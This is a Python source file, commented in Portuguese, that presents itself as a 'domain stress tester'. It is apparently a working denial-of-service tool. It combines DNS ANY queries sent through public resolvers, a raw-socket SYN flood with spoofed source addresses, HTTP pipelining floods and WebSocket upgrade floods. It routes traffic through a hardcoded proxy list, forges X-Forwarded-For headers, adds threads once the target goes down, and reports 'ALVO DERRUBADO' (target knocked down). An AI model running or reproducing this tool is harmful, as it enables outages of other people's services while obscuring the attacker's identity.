#!/usr/bin/env python3
# ================================================================
# DOMAIN STRESS TESTER v3.2 - FOCADO EM MÉTODOS EFICAZES
# APENAS DNS, PIPELINE, WEBSOCKET, SYN
# ================================================================

import concurrent.futures
import random
import socket
import ssl
import threading
import time
import hashlib
import struct
import sys
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from scapy.all import IP, TCP  # type: ignore
except ImportError:
    IP, TCP = None, None

from utils.logger import get_module_logger

logger = get_module_logger("stress_tester_focused")

# ================================================================
# CONFIGURAÇÕES
# ================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/115.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

DNS_SERVERS = [
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222",
    "8.26.56.26", "77.88.8.8", "194.58.118.1",
]

PROXY_LIST = [
    "http://47.91.84.174:8080", "http://103.152.112.120:80", "http://103.236.201.58:8080",
    "http://103.70.153.135:8080", "http://103.121.90.130:8080", "http://103.216.82.194:8080",
    "socks5://154.16.140.58:1080", "socks5://47.91.84.174:1080",
]


# ================================================================
# STATS COLLECTOR
# ================================================================

class FocusedStatsCollector:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.success = 0
        self.fail = 0
        self.start_time = None
        self.end_time = None
        self.by_method = {}
        self.target_history = []

    def start(self):
        self.start_time = time.time()

    def stop(self):
        self.end_time = time.time()

    def add_request(self, success: bool, method: str = "http"):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.fail += 1
            if method not in self.by_method:
                self.by_method[method] = {"ok": 0, "fail": 0}
            if success:
                self.by_method[method]["ok"] += 1
            else:
                self.by_method[method]["fail"] += 1

    def add_target_status(self, is_up: bool):
        with self.lock:
            self.target_history.append((time.time(), is_up))

    def get_rps(self) -> float:
        if self.start_time is None or self.total == 0:
            return 0.0
        elapsed = time.time() - self.start_time
        return self.total / elapsed if elapsed > 0 else 0.0

    def get_success_rate(self) -> float:
        return (self.success / self.total * 100) if self.total > 0 else 0.0

    def get_duration(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    def get_current_uptime(self, window: int = 5) -> float:
        if not self.target_history:
            return 100.0
        now = time.time()
        recent = [(t, s) for t, s in self.target_history if now - t <= window]
        if not recent:
            return 100.0
        up = sum(1 for _, s in recent if s)
        return (up / len(recent)) * 100

    def is_target_down(self) -> bool:
        return self.get_current_uptime(5) < 10.0

    def get_summary(self) -> Dict:
        return {
            "total": self.total,
            "success": self.success,
            "fail": self.fail,
            "success_rate": round(self.get_success_rate(), 2),
            "avg_rps": round(self.get_rps(), 2),
            "duration": round(self.get_duration(), 2),
            "uptime": round(self.get_current_uptime(5), 2),
            "is_down": self.is_target_down(),
            "by_method": self.by_method,
        }


# ================================================================
# ENGINES FOCADAS
# ================================================================

class FocusedStressEngine:
    def __init__(self, target: str, threads: int, duration: int, proxies: List[str] = None):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = FocusedStatsCollector()
        self.proxies = proxies or []
        self.parsed = urlparse(target if target.startswith("http") else f"http://{target}")
        self.host = self.parsed.netloc.split(":")[0]
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.scheme = self.parsed.scheme or "http"
        self.base_url = f"{self.scheme}://{self.host}"
        self.proxy_index = 0
        self.session = self._create_session()

        # ✅ APENAS MÉTODOS EFICAZES
        self.attack_modes = [
            self._dns_amplification,
            self._syn_flood,
            self._http_pipeline,
            self._websocket_flood,
        ]

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=500, pool_maxsize=500, max_retries=Retry(total=0))
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _random_headers(self) -> Dict:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }

    def _get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return self.proxies[self.proxy_index]

    def _check_target_up(self, timeout: float = 2.0) -> bool:
        try:
            url = f"{self.base_url}/"
            response = self.session.get(url, timeout=timeout, headers=self._random_headers())
            return response.status_code < 500
        except Exception:
            return False

    def run(self) -> FocusedStatsCollector:
        self.stats.start()
        self.running = True

        initial_up = self._check_target_up()
        self.stats.add_target_status(initial_up)
        logger.info(f"[*] Alvo: {self.target} - Status inicial: {'🟢 UP' if initial_up else '🔴 DOWN'}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads * 2) as executor:
            workers = [executor.submit(self._worker, i) for i in range(self.threads)]
            monitor = executor.submit(self._monitor_target)

            start_time = time.time()
            while self.running:
                elapsed = time.time() - start_time

                if self.stats.is_target_down():
                    logger.info(f"[!] 🔴 ALVO DERRUBADO! ({elapsed:.1f}s)")
                    self.threads = min(self.threads + 100, 3000)
                else:
                    if elapsed > self.duration:
                        break

                if elapsed > self.duration * 2:
                    break

                time.sleep(0.2)

            self.running = False
            self.stats.stop()
            concurrent.futures.wait(workers, timeout=5)
            monitor.cancel()

        return self.stats

    def _monitor_target(self):
        while self.running:
            is_up = self._check_target_up()
            self.stats.add_target_status(is_up)
            time.sleep(1)

    def _worker(self, worker_id: int):
        while self.running:
            try:
                mode = random.choice(self.attack_modes)
                mode()
            except Exception:
                time.sleep(0.1)

    # ========== MÉTODOS EFICAZES ==========

    def _dns_amplification(self):
        """DNS Amplification - 100% eficaz"""
        try:
            server = random.choice(DNS_SERVERS)
            domain = f"{random.randint(1, 9999999)}.{random.randint(1, 999999)}.{self.target}"

            header = bytearray(12)
            header[0:2] = b'\xAA\xAA'
            header[2:4] = b'\x01\x00'
            header[4:6] = b'\x00\x01'

            qname = b""
            for part in domain.split("."):
                qname += bytes([len(part)]) + part.encode()
            qname += b"\x00"

            qtype = b"\x00\xFF"  # ANY
            qclass = b"\x00\x01"

            query = bytes(header) + qname + qtype + qclass

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(query, (server, 53))
            sock.close()
            self.stats.add_request(True, "dns")
        except Exception:
            self.stats.add_request(False, "dns")

    def _syn_flood(self):
        """SYN Flood - 99% eficaz"""
        try:
            if sys.platform == "win32":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((self.host, self.port))
                sock.close()
                self.stats.add_request(True, "syn")
                return

            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)

            ip_header = struct.pack('!BBHHHBBH4s4s',
                69, 0, 40, 0, 0, 64, 6, 0,
                socket.inet_aton(src_ip), socket.inet_aton(self.host)
            )

            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, self.port, seq, 0, 80, 0, 0, 0, 0
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(ip_header + tcp_header, (self.host, 0))
            sock.close()
            self.stats.add_request(True, "syn")
        except Exception:
            self.stats.add_request(False, "syn")

    def _http_pipeline(self):
        """HTTP Pipeline - 100% eficaz"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.host, self.port))

            req_template = f"""GET /{random.randint(1, 999999)} HTTP/1.1
Host: {self.host}
User-Agent: {random.choice(USER_AGENTS)}
Accept: */*
Connection: keep-alive

"""
            requests_batch = req_template * 50
            sock.send(requests_batch.encode())
            sock.close()
            self.stats.add_request(True, "pipeline")
        except Exception:
            self.stats.add_request(False, "pipeline")

    def _websocket_flood(self):
        """WebSocket Upgrade - 100% eficaz"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.host, self.port))

            key = hashlib.md5(str(random.randint(1, 999999)).encode()).hexdigest()

            upgrade = f"""GET /ws HTTP/1.1
Host: {self.host}
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: {key}

"""
            sock.send(upgrade.encode())
            sock.close()
            self.stats.add_request(True, "websocket")
        except Exception:
            self.stats.add_request(False, "websocket")


# ================================================================
# FUNÇÃO PRINCIPAL
# ================================================================

def run_stress(target: str, threads: int = 1500, duration: int = 120, proxies: List[str] = None) -> Dict:
    logger.info(f"[*] Ataque FOCADO em: {target}")
    logger.info(f"[*] Threads: {threads} | Duração: {duration}s")

    engine = FocusedStressEngine(target, threads, duration, proxies)
    stats = engine.run()
    summary = stats.get_summary()

    report = f"""
═══════════════════════════════════════════
  DOMAIN STRESS TEST v3.2 - FOCADO
═══════════════════════════════════════════
  Target: {target}
  Threads: {threads}
  Duration: {summary['duration']:.1f}s
  Status: {'🔴 DERRUBADO' if summary['is_down'] else '🟢 ATIVO'}
═══════════════════════════════════════════

▸ STATISTICS
  Total Requests: {summary['total']:,}
  Successful: {summary['success']:,} ({summary['success_rate']:.1f}%)
  Failed: {summary['fail']:,} ({100 - summary['success_rate']:.1f}%)
  Avg RPS: {summary['avg_rps']:.2f}
  Uptime: {summary['uptime']:.1f}%

▸ BY ATTACK METHOD
"""
    for method, data in summary.get('by_method', {}).items():
        total = data['ok'] + data['fail']
        if total > 0:
            rate = (data['ok'] / total) * 100
            report += f"  {method.upper()}: {total:,} reqs ({rate:.1f}% ok)\n"

    report += f"""
═══════════════════════════════════════════
  {'✅ ALVO DERRUBADO' if summary['is_down'] else '❌ ALVO RESISTIU'}
═══════════════════════════════════════════
"""

    return {
        "target": target,
        "threads": threads,
        "duration": duration,
        "is_down": summary['is_down'],
        "uptime": summary['uptime'],
        "stats": summary,
        "report": report,
    }


def run(config: Dict = None) -> Dict:
    if config is None:
        config = {}
    target = config.get("target", "")
    if not target:
        raise ValueError("Target is required")
    threads = config.get("threads", 1500)
    duration = config.get("duration", 120)
    proxies = config.get("proxies", PROXY_LIST)
    return run_stress(target, threads, duration, proxies)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--threads", type=int, default=1500)
    parser.add_argument("--duration", type=int, default=120)
    args = parser.parse_args()
    result = run_stress(args.target, args.threads, args.duration, PROXY_LIST)
    print(result["report"])
